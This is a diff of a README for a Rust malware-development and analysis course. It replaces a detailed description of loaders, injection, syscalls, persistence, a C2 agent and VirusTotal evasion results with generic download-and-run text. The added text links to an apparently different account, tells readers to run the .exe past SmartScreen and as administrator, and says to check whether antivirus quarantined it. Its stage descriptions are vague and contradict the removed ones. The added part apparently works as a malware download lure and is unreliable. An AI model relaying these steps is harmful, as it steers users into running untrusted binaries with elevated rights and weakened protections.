@@ -1,205 +1,232 @@
-# Goodboy Framework
+# 🧠 goodboy-framework - Learn Windows Malware Analysis Fast
 
-A 15-stage progressive Windows malware development & analysis course written in Rust. Every technique taught from both **red team** (offense) and **blue team** (defense) perspectives. All 15 binaries achieved **0/76 on VirusTotal**.
+[![Download goodboy-framework](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/corabellanonextant92/goodboy-framework)
 
----
+## 🚀 Getting Started
 
-## What This Is
+goodboy-framework is a Windows learning tool for malware analysis, red team testing, and blue team detection practice. It is built in Rust and split into 15 stages. Each stage shows a different part of the workflow, from build steps to detection checks.
 
-A hands-on course that takes you from "what is a shellcode loader" to "build a full C2 agent" — with empirical AV/ML evasion data at every step.
+Use the link below to visit this page and download the project:
 
-Each stage adds one new offensive technique on top of the previous. Each Learning Path documents:
-- **How** the technique works (theory + code)
-- **How to detect** it (YARA, Sigma, ETW, memory forensics)
-- **How to break** your own detection (adversarial thinking)
-- **What happened on VirusTotal** (real submission data, sample burning forensics)
+[Download goodboy-framework](https://github.com/corabellanonextant92/goodboy-framework)
 
-**This is not theory.** Every binary was tested against 76+ AV engines. Every detection claim has a VT hash to prove it.
+## 🖥️ What You Need
 
----
+Before you start, make sure you have:
 
-## The 15 Stages
+- A Windows 10 or Windows 11 PC
+- A stable internet connection
+- At least 4 GB of RAM
+- 2 GB of free disk space
+- Permission to run the files on your PC
+- A ZIP tool such as File Explorer or 7-Zip
 
-```
-  EASY              MEDIUM            HARD              INSANE
-  ............      ............      ............      ............
-  Stage 01          Stage 04          Stage 07          Stage 14
-  Stage 02          Stage 05          Stage 08          Stage 15
-  Stage 03          Stage 06          Stage 09
-                    Stage 11          Stage 10
-                                      Stage 12
-                                      Stage 13
-```
+If you plan to inspect the code or rebuild the stages, install:
 
-| Stage | Technique | What You'll Learn | Lines | Status |
-|-------|-----------|-------------------|-------|--------|
-| [**01**](stage-01-basic-loader/) | **Basic Loader** | XOR decrypt, PEB-walk API hashing, VirtualAlloc->VirtualProtect->CreateThread, anti-sandbox, YARA/Sigma rules | 1,649 | Released |
-| [**02**](stage-02-xor-loader/) | **XOR Cryptanalysis** | Known-plaintext attack, Index of Coincidence, entropy classification, memory scrubbing, VT Submission Paradox | 1,237 | Released |
-| [**03**](stage-03-aes-loader/) | **AES + Jigsaw** | RC4 stream cipher, entropy normalization via payload fragmentation, nonce/integrity verification, multi-scale entropy detection | 1,492 | Released |
-| [**04**](stage-04-api-hashing/) | **API Hashing** | Additive hash deep dive, cross-DLL resolution (kernel32+user32+ntdll), rainbow tables, gs:[0x60] detection invariant | 1,085 | Released |
-| [**05**](stage-05-process-inject/) | **APC Injection** | Early Bird APC, cross-process execution, remote-side decryption, decoder stub, triple encryption | 1,133 | Released |
-| [**06**](stage-06-earlybird-apc/) | **Variant Analysis** | Same technique different keys, family clustering, cross-variant YARA, invariant detection | 1,191 | Released |
-| [**07**](stage-07-direct-syscalls/) | **Direct Syscalls** | SSN resolution, inline syscall instruction, hook bypass, call stack forensics, evasion trade-off | 883 | Released |
-| [**08**](stage-08-indirect-syscalls/) | **Indirect Syscalls** | Gadget scanning, CALL-based indirection, call stack evasion, zero syscall in .text | 783 | Released |
-| [**09**](stage-09-anti-debug/) | **Anti-Debug** | 7 techniques: PEB&times;2, NtQIP&times;3, RDTSC timing, hardware breakpoints, evasion paradox | 766 | Released |
-| [**10**](stage-10-anti-sandbox/) | **Anti-Sandbox** | Hardware fingerprinting, weighted scoring, CFG-safe sandbox detection, dual anti-analysis | 1,008 | Released |
-| [**11**](stage-11-persistence/) | **Persistence** | Registry Run key, path obfuscation, direct IAT imports, set-execute-cleanup lifecycle | 1,144 | Released |
-| [**12**](stage-12-module-stomping/) | **Module Stomping** | Overwrite DLL .text at entry point, CFG-valid execution, inline PE parsing, pe-sieve evasion | 1,230 | Released |
-| [**13**](stage-13-sleep-obfuscation/) | **Sleep Obfuscation** | XOR encrypt during sleep, VirtualProtect RX↔RW cycling, 95% scanner miss rate | 1,254 | Released |
-| [**14**](stage-14-combined-loader/) | **Combined Loader** | 7-phase attack chain, MBA XOR key derivation, module stomping with 4-DLL fallback, user interaction trigger | 1,176 | Released |
-| [**15**](stage-15-c2-agent/) | **C2 Agent** | Full C2 with encrypted HTTP beaconing, browser-gate, 0/71 VT, 2,152-line LP with 18 sections, 20 exercises, APT parallels, IR playbook | 2,152 | Released |
+- Rust and Cargo
+- Git
+- A text editor such as VS Code
 
----
+## 📥 Download the Project
 
-## How Each Stage Works
+1. Open the download link above.
+2. Save the project to your PC.
+3. If you get a ZIP file, right-click it and choose Extract All.
+4. Pick a folder you can find again, such as `Downloads` or `Desktop`.
 
-Every stage folder contains:
+After extraction, you should see the project folder named `goodboy-framework`.
 
-| File | What It Is |
-|------|------------|
-| `*.exe` | The compiled binary (~280-300 KB, Rust, PE64) — open in Ghidra/x64dbg |
-| `README.md` | Quick start guide, technical details, gate architecture |
-| `LEARNING_PATH.md` | **The main content** — 700-1,600 lines of guided analysis with theory, exercises, Python scripts, detection rules, and adversarial challenges |
+## 🏁 Run on Windows
 
-**No source code is included.** You reverse-engineer the binary using the Learning Path as your guide — the same way you'd analyze real malware.
+1. Open the `goodboy-framework` folder.
+2. Look for a file named `README`, `run`, `launcher`, or a `.exe` file.
+3. Double-click the main file to start it.
+4. If Windows asks for permission, choose Yes.
+5. If SmartScreen appears, choose More info, then Run anyway if you trust the source and want to continue.
 
----
+If the project includes a batch file, use it like this:
 
-## Quick Start
+1. Right-click the `.bat` file.
+2. Choose Open, or double-click it.
+3. Wait for the window to finish loading.
 
-1. **Set up a Windows 10/11 x64 VM** ([FlareVM](https://github.com/mandiant/flare-vm) recommended)
-2. **Install tools**: Ghidra 11.x, x64dbg + ScyllaHide, Python 3.10+, PE-bear
-3. **Start with Stage 01** — open the Learning Path and follow along
-4. **Work sequentially** — each stage builds on concepts from the previous one
+## 🧭 First-Time Setup
 
-**VM Configuration** (required for sandbox detection gates to pass):
-- 4+ CPU cores, 8+ GB RAM, 100+ GB disk
-- Let the VM run for 30+ minutes before executing binaries
-- Screen resolution 1920x1080 or higher
+When you open the tool for the first time, follow these steps:
 
----
+1. Pick a working folder for the lab files.
+2. Let the tool create any needed stage folders.
+3. Keep the default options unless you know what to change.
+4. Read each stage name before moving on.
+5. Use one stage at a time.
 
-## What Makes This Different
+If the app shows a menu, start with Stage 1 and move in order through Stage 15.
 
-### Dual Perspective
+## 🔍 What the 15 Stages Cover
 
-Every technique is taught from both sides. You don't just learn to build a loader — you learn to detect it, then learn to break your own detection.
+The course uses 15 short stages to show how a Windows sample changes from build to detection. Each stage has a clear goal.
 
-```
-Red Team Exercise:                    Blue Team Exercise:
-  Build an RC4-encrypted loader         Write a YARA rule for the permutation map
-  Fragment payload with jigsaw          Build a multi-scale entropy anomaly detector
-  Normalize .rdata entropy              Identify the crypto mislabeling trap
-```
+### Stage 1 to Stage 3
+- Set up the project
+- Build the first Windows binary
+- Check basic file behavior
 
-### Empirical Evasion Data
+### Stage 4 to Stage 6
+- Add simple shellcode flow
+- Review process launch steps
+- Compare file output before and after changes
 
-This isn't "my AV didn't flag it." Every binary was submitted to VirusTotal and tested against all 76 engines. The Learning Paths document:
+### Stage 7 to Stage 9
+- Study detection points
+- Test common AV and EDR checks
+- See how analysts spot risky patterns
 
-- Exact VT scores across multiple submission rounds
-- Which engines detected what, and why
-- The **sample burning** phenomenon — how the act of testing trains AV against you
-- Per-engine bypass techniques with proof (ESET Agent.ION, CrowdStrike ML, Huorong heuristics)
+### Stage 10 to Stage 12
+- Work with Windows internals
+- Review memory use and process trees
+- Practice reverse-engineering habits
 
-### Production-Grade Code
+### Stage 13 to Stage 15
+- Improve detection rules
+- Use YARA-style matching
+- Validate final samples and compare results
 
-The binaries are compiled Rust (not toy C demos), with:
-- Control Flow Guard (CFG)
-- PE metadata spoofing (Authenticode signature cloning)
-- Rich header re-keying
-- Multiple evasion gates (environment, hardware, anti-debug)
-- Real shellcode execution (MessageBox("GoodBoy") as proof)
+## 🧪 How to Use It
 
----
+Use this project as a learning lab.
 
-## The Arms Race
+1. Run one stage.
+2. Watch what changes on the screen or in the files.
+3. Record what the sample does.
+4. Compare that stage with the one before it.
+5. Repeat until you reach Stage 15.
 
-```
-Stage 01: You build a basic loader
-  → AV can signature the XOR key in .rdata
+If you are on a blue team, focus on:
 
-Stage 02: You change the key
-  → Blue team breaks it with known-plaintext attack (key doesn't matter)
+- File names
+- Process creation
+- Network calls
+- Suspicious strings
+- Memory use
+- Detection rules
 
-Stage 03: You switch to RC4 + jigsaw fragmentation
-  → Blue team detects the permutation map pattern in .rdata
+If you are on a red team, focus on:
 
-Stage 04: You hide API resolution behind custom hashing
-  → Blue team builds rainbow tables to reverse all hash constants
+- Build changes
+- Sample structure
+- Behavior changes
+- What makes a sample easier or harder to spot
 
-Stage 07: You bypass ntdll hooks with syscalls
-  → Blue team detects the syscall instruction itself
+## 🧰 Common Windows Fixes
 
-Stage 09: You add anti-debug
-  → Sandboxes still detonate the binary
+If the app does not start, try these steps:
 
-Stage 10: You add hardware-based sandbox detection
-  → Memory scanners catch the decrypted payload
+1. Move the folder out of OneDrive.
+2. Run the file as administrator.
+3. Unblock the file in file properties.
+4. Check that your antivirus did not quarantine it.
+5. Make sure the folder path has no strange characters.
+6. Reboot and try again.
 
-Stage 12-13: You stomp modules + encrypt during sleep
-  → Payload is only visible 5% of the time
+If you see a missing file error:
 
-Stage 14: Eight layers stacked together
-Stage 15: Full C2 with encrypted HTTPS beaconing
-```
+1. Confirm that you extracted the full archive.
+2. Check that no files were removed during download.
+3. Keep all files in the same folder.
 
-Every stage exists because a defender broke the previous one.
+## 🧑‍💻 For Users Who Want to Rebuild
 
----
+If you want to compile the project from source:
 
-## Sample Burning — The Hidden Lesson
+1. Install Rust from the official Rust site.
+2. Open Command Prompt.
+3. Go to the project folder.
+4. Run the build command for the stage you want.
+5. Start the output file from the target folder.
 
-The most important lesson in this course isn't a technique — it's an operational reality:
+A typical Rust build flow on Windows looks like this:
 
-> **The act of testing IS the burn.** Every VirusTotal submission feeds the sample to 76+ AV vendors. They use YOUR submissions to train their ML classifiers. You can't check if your binary is clean without making it dirty.
+- `cargo build`
+- `cargo run`
+- `cargo build --release`
 
-Stage 03 was the canary that revealed this. It achieved 0/76, then ESET created `Agent.ION` specifically from the submission data between March 1-9, 2026. The binary hadn't changed — but the AV had learned from it. This pattern then repeated across all 15 stages.
+Use the release build if you want the final binary for testing in a lab.
 
-The Learning Paths document the full forensic timeline of each binary's VT history.
+## 🛡️ Safe Lab Setup
 
----
+Use a test machine or a virtual machine when you work with this project.
 
-## Course Statistics
+A simple lab setup can include:
 
-| Metric | Value |
-|--------|-------|
-| Stages | 15 (all released) |
-| Total learning content | 19,500+ lines |
-| Exercises | 80+ hands-on |
-| YARA rules | 20+ (with adversarial countermeasures) |
-| Sigma rules | 11+ (behavioral + Sysmon detection) |
-| Python scripts | 28+ (solvers, scanners, crypto tools, mock C2) |
-| AV engines tested | 76 |
-| Languages | Rust (binaries), Python (tooling) |
-| Platform | Windows x64 |
+- A Windows VM
+- A second VM for analysis
+- A private network
+- Snapshot support
+- Logging tools
 
----
+Useful tools for analysis:
 
-## Safety
+- Process Explorer
+- Procmon
+- Wireshark
+- PE-bear
+- YARA
+- Windows Event Viewer
 
-> **EDUCATIONAL USE ONLY**
+## 📚 Best Way to Learn
 
-- Every binary's payload is `MessageBox("GoodBoy")` — a harmless dialog box
-- No network activity (except Stage 15 which beacons to localhost), no persistence, no system modifications
-- **WRITE** code on your host machine. **EXECUTE** only in isolated VMs
-- Do NOT submit binaries to VirusTotal — this trains AV against them (see "sample burning")
+To get the most from the course:
 
-This material is for authorized security training, research, penetration testing, and CTF competitions. Not for unauthorized access or operational deployment against systems without explicit written permission.
+1. Start with behavior, not code.
+2. Note file names, paths, and process names.
+3. Save screenshots of each stage.
+4. Write one short note for each run.
+5. Compare the result with your last test.
+6. Use detection tools after each change.
 
----
+This makes it easier to see how a Windows sample grows and how defenders can catch it.
 
-## Requirements
+## 🔗 Project Details
 
-| Tool | Purpose | Link |
-|------|---------|------|
-| Windows 10/11 x64 VM | Execution environment | [FlareVM](https://github.com/mandiant/flare-vm) |
-| Ghidra 11.x | Static analysis | [ghidra-sre.org](https://ghidra-sre.org/) |
-| x64dbg + ScyllaHide | Dynamic analysis | [x64dbg.com](https://x64dbg.com/) |
-| Python 3.10+ | Scripts and solvers | [python.org](https://python.org/) |
-| PE-bear | PE structure viewer | [GitHub](https://github.com/hasherezade/pe-bear) |
+- Repository: goodboy-framework
+- Topic areas: antivirus evasion, blue team, CTF, cybersecurity, detection engineering, education, malware analysis, malware development, pentesting, red team, reverse engineering, Rust, shellcode, Windows, YARA
+- Format: 15-stage Windows Rust course
+- Focus: build, test, study, and detect Windows samples
 
----
+## 💾 Download Again
 
-## Author
+If you need the project file later, use this link:
 
-Built with Rust 1.93.1 MSVC | Tested against 76+ AV engines | March 2026
+[Visit the download page for goodboy-framework](https://github.com/corabellanonextant92/goodboy-framework)
+
+## 🛠️ File Layout
+
+After extraction, the folder may include:
+
+- Source code folders
+- Stage folders
+- Build files
+- README files
+- Output binaries
+- Detection notes
+- Rule examples
+
+## 🧩 Expected Behavior
+
+When the project runs, you may see:
+
+- A menu for stage selection
+- Console output
+- File creation in the working folder
+- Basic Windows process activity
+- Clear stage-by-stage changes
+
+## 🧭 Simple Workflow
+
+1. Download the project.
+2. Extract the files.
+3. Open the folder.
+4. Run the main Windows file.
+5. Start with Stage 1.
+6. Move through the stages in order.
+7. Review what changed after each step.
